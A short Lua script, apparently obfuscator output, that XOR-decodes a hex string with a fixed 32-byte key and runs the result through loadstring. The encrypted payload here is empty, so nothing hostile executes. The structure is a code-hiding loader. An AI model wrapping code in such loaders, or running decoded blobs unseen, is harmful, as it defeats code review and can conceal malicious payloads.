local k={213,155,158,254,93,87,60,89,46,106,60,29,141,250,188,247,228,228,33,45,121,55,193,131,87,144,163,199,142,153,28,27}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
